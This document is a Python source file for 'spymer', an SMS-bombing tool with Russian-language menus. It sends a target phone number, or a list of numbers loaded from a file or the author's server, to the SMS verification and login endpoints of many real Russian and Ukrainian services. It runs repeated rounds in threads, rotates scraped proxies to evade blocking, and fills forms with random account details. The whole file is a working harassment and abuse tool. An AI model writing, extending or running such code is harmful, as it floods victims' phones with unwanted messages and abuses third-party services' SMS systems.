#!/usr/bin/python3
# -*- coding: utf-8 -*-
# spymer v9.0
# Author: FSystem88
import os
def MAIN():
	try:
		import requests
		import random
		import datetime
		import sys
		import re
		import time
		import datetime
		import json
		import threading
		from threading import Thread
		from colorama import Fore, Back, Style
		from random import randint
		def Main():
			global phone
			global info
			global proxy
			global proxies

			r = Fore.RED
			g = Fore.GREEN
			y = Fore.YELLOW
			s = Style.RESET_ALL

			def mask(str, maska):
				if len(str) == maska.count('#'):
					str_list = list(str)
					for i in str_list:
						maska=maska.replace("#", i, 1)
					return maska

			def sms():
				global phone
				global name
				global password
				global email
				global proxies
				phone9 = phone[1:]
				try:
					try:
						requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://www.avito.ru/novosibirsk#registration", data={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, proxies=proxies, timeout=10)
					
					except:
						pass
					try:
						# под сомнением 
						phonee=mask(str=phone, maska="#(###)###-##-##")
						requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonee}, proxies=proxies, timeout=10)

						phonee=mask(str=phone, maska="+#(###)###-##-##")
						requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonee}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone, maska="8(###)###-##-##")
						requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": phonee,"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"}, proxies=proxies, timeout=10)
					except:
						pass
				except:
					pass

			def clear():
				os.system('cls' if os.name=='nt' else 'clear')
					
			def checkver():
				opo = 2
				if opo == 1:
					print('лох')
			def logo(): 
				print('		By Artem Alehin')
				print('		RUSYA PETYX')

			

			def updateproxy():
				global proxy
				global info
				try:
					print ("Введите proxy в формате ip:port.")
					print ("Пример: "+Fore.GREEN+"123.45.6.78:8080"+Style.RESET_ALL)
					print ("Для отмены нажмите Ctrl+C")
					proxy = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
					if proxy == "":
						info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
						proxy = "localhost"
					else:
						print("Проверяю прокси...")
						ip = requests.get("http://fsystem88.ru/ip", verify=False, timeout=10).text
						try:
							ipx = requests.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(proxy), 'https':"http://{}".format(proxy)}, verify=False, timeout=10).text
						except:
							ipx = ip
						if ip != ipx:
							info = Fore.GREEN+"Proxy рабочий."+Style.RESET_ALL
						else:
							print(Fore.RED+"{} не работает. Введите новый!".format(proxy)+Style.RESET_ALL)
							updateproxy()
				except:
					info = Fore.RED+"\nНекорректно введены данные!"+Style.RESET_ALL
					proxy = "localhost"

			def generateproxy():
				global proxy
				global info

				print(Fore.YELLOW+"Подождите генерируем рабочий прокси.\nОбычно это занимает не больше 30 секунд..."+Style.RESET_ALL)
				url="https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=RU"
				req = requests.get(url)
				ip = requests.get("http://fsystem88.ru/ip").text
				array = req.text.split()
				open("proxies.txt", "w+").close()
				for prox in array:
					thread_list = []
					t = threading.Thread (target=checkproxy, args=(ip, prox))
					thread_list.append(t)
					t.start()
				time.sleep(20)
				f = open("proxies.txt")
				proxies = f.read().split()
				proxy = random.choice(proxies)
				info = Fore.GREEN+"Рабочий прокси успешно найден!"+Style.RESET_ALL

			def checkproxy(ip, prox):
				try:
					ipx = requests.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}, verify=False, timeout=10).text
				except:
					ipx = ip
				if ip != ipx:
					f = open("proxies.txt", "a+")
					f.write("{}\n".format(prox))
					f.close()
			
			def make7phone():
				global phone
				if phone[0] == '+':
					phone = phone[1:]
				elif phone[0] == '8':
					phone = '7'+phone[1:]
				elif phone[0] == '9':
					phone = '7'+phone

			def addparams():
				global name
				global password
				global email
				name = ''
				for x in range(12):
					name = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
					password = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
					email = "{}@gmail.com".format(name)

			def update():
				a=input("Вы уверены, что хотите обновить? (y/n) ")
				if a=="y":
					os.system("cd && rm -rf spymer && git clone https://github.com/artemalehin/spymer && cd spymer && sh install.sh")
					exit()
				else:
					print("Отменено")

			def onesend():
				global phone
				global name
				global password
				global email
				global proxy
				global info
				global proxies
				clear()
				logo()
				print(info)
				print('Введите телефон ("Enter" - отмена):')
				phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				try:
					if int(phone):
						print('Введите количество кругов ("Enter" - отмена):')
						count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						try:
							if int(count):
								count=int(count)
								make7phone()
								iteration = 0
								addparams()
								info = '\nТелефон: {}\nКол-во кругов: {}'.format(phone, count)+'\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.'
								clear()
								logo()
								print(info)
								if proxy=="localhost":
									proxies=None
								else:
									proxies={'http': "http://{}".format(proxy), 'https':"http://{}".format(proxy)}
								while iteration < count:
									addparams()
									sms()
									iteration+=1
									print("{} круг пройден.".format(iteration))
								info = Fore.BLUE+"\nГотово.\nТелефон: {}\nКол-во кругов: {}".format(phone, iteration)+Style.RESET_ALL
						except:
							info=Fore.RED+"Неверно введено кол-во кругов"+Style.RESET_ALL
				except:
					info=Fore.RED+"Неверно введен номер телефона"+Style.RESET_ALL

			def filesend():
				global phone
				global name
				global password
				global email
				global proxy
				global info
				global proxies
				clear()
				logo()
				print(info)
				print("Введите путь к файлу: ")
				print("(Папка с файлом должна находиться в домашней дирректории!)")
				print("Не знаешь, как создать файл в терминале - воспользуйся токеном!")
				f_name=input(Fore.BLUE+"spymer > "+Style.RESET_ALL+"~/")
				clear()
				logo()
				print(info)
				try:
					os.chdir(os.getenv("HOME"))
					file=open("{}".format(f_name))
					array=file.read().splitlines()
					if array[-1] == '':
						array.pop()
					print("Файл найден.\nНомера:\n{}".format(array))
					print('Введите количество кругов ("Enter" - отмена):')
					count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
					try:
						if int(count):
							count=int(count)
							info = '\nФайл: ~/{}\nКол-во кругов: {}'.format(f_name, count)
							clear()
							logo()
							print(info)
							for phone in array:
								make7phone()
								if proxy=="localhost":
									proxies=None
								else:
									proxies={'http': "http://{}".format(proxy), 'https':"http://{}".format(proxy)}
								try:
									if int(phone):
										print('\nЗапущен спам на {}.Если хочешь остановить - нажмите Ctrl+Z.'.format(phone))
										thread_list = []
										t = threading.Thread (target=n_send, args=(phone,count, proxies))
										thread_list.append(t)
										t.start()
								except:
									print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
							for th in threading.enumerate(): 
								if th != threading.currentThread():
									th.join()	
					except:
						info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL

					print(Fore.BLUE+"\nГотово.\nФайл: {}\nКол-во кругов: {}".format(f_name, count)+Style.RESET_ALL)
					exit()
				except FileNotFoundError:
					info=Fore.RED+"\nФайл {} не найден".format(f_name)+Style.RESET_ALL

			def tokensend():
				global phone
				global name
				global password
				global email
				global proxy
				global info
				global proxies
				clear()
				logo()
				print(info)
				print("Введите токен: ")
				print("Загрузить файл и получить токен можно по ссылке:")
				print(Fore.GREEN+"https://FSystem88.ru/spymer/\n"+Style.RESET_ALL)
				token=input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				id=requests.post('https://fsystem88.ru/spymer/spym.php', data={'token': token}).json()["id"]
				if int(id) != 0:
					req=requests.get("https://fsystem88.ru/spymer/token/{}".format(token))
					info=""
					clear()
					logo()
					print(info)
					array=req.text.splitlines()
					if "<h1>Not Found</h1>" in array:
						info=Fore.RED+"Токен не найден на сервере.\n Загрузите файл и получите токен на сайте:\n"+Fore.GREEN+"https://FSystem88.ru/spymer"+Style.RESET_ALL
					else:
						if array[-1] == '':
							array.pop()
						print("Файл загружен успешно.\nТелефоны:\n{}".format(req.text))
						print('Введите количество кругов ("Enter" - отмена):')
						count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						try:
							if int(count):
								count=int(count)
								info = '\nТокен: {}\nКол-во кругов: {}'.format(token, count)
								clear()
								logo()
								print(info)
								for phone in array:
									make7phone()
									if proxy=="localhost":
										proxies=None
									else:
										proxies={'http': "http://{}".format(proxy), 'https':"http://{}".format(proxy)}
									try:
										if int(phone):
											print('\nЗапущен спам на {}.Если хочешь остановить - нажмите Ctrl+Z.'.format(phone))
											thread_list = []
											t = threading.Thread (target=n_send, args=(phone,count, proxies))
											thread_list.append(t)
											t.start()
									except:
										print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
								for th in threading.enumerate(): 
									if th != threading.currentThread():
										th.join()	
						except:
							info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL

						print(Fore.BLUE+"\nГотово.\nТокен: {}\nКол-во кругов: {}\n".format(token, count)+Style.RESET_ALL)
						exit()

			def n_send(phone, count, proxies):
				global name
				global password
				global email
				global info
				iteration=0
				while iteration < count:
					addparams()
					sms()
					iteration+=1
					print(Fore.GREEN+"{}".format(phone)+Style.RESET_ALL+": круг №{} пройден. Но Эдик все же ЛОХ!!!".format(iteration))
				print(Fore.GREEN+"\nСпам на {} закончен. Кол-во кругов {}".format(phone, count)+Style.RESET_ALL)
				exit()

			def main():
				global phone
				global info
				global proxy
				
				global proxies 
				proxy = "localhost"
				info = " "
				while True:
					clear()
					logo()
					print(info)
					checkver()
					print("Proxy: "+Fore.BLUE+"{}".format(proxy)+Style.RESET_ALL)
					if proxy == "localhost":
						print(Fore.YELLOW+"Советую использовать прокси !!!"+Style.RESET_ALL)
					print("1) СМС спамер.")
					print("2) Обновить прокси.")
					print("3) Обновить SPYMER.")
					print("4) Выход.")
					input1 = input(Fore.BLUE+"Введите номер пункта: "+Style.RESET_ALL)
					if input1 == "1":
						clear()
						logo()
						print(info)
						print("Выберите один вариант:")
						print("1. Запустить спамер на один номер")
						print("2. Выгрузить номера из TXT файла ")
						print("3. Выгрузить номера по токену")
						input11= input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						if input11 == "1":
							onesend()
							import webbrowser
							webbrowser.open ('https://vk.com/artem_036', new=2)

						elif input11 == "2":
							filesend()

						elif input11 == "3":
							tokensend()
						else:
							print("Некорректно")
					
					elif input1 == "2":
						print("1. Удалить прокси")
						print("2. Ввести свой прокси")
						print("3. Сгенерировать прокси")
						input51 = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						if input51=="1":
							proxy = "localhost"
						
						elif input51=="2":
							updateproxy()

						elif input51=="3":
							generateproxy()

					elif input1 == "3":
						update()
					
					elif input1 == "4":
						print (Fore.BLUE+"\nДо скорой встречи!)\n"+Style.RESET_ALL)
						exit()

			main()
		Main()	
	except ModuleNotFoundError:
		os.system('cls' if os.name=='nt' else 'clear')
		print("Нажмите Enter чтобы установить недостающие библиотеки...")
		input()
		os.system("python -m pip install requests colorama")

		MAIN()

MAIN()
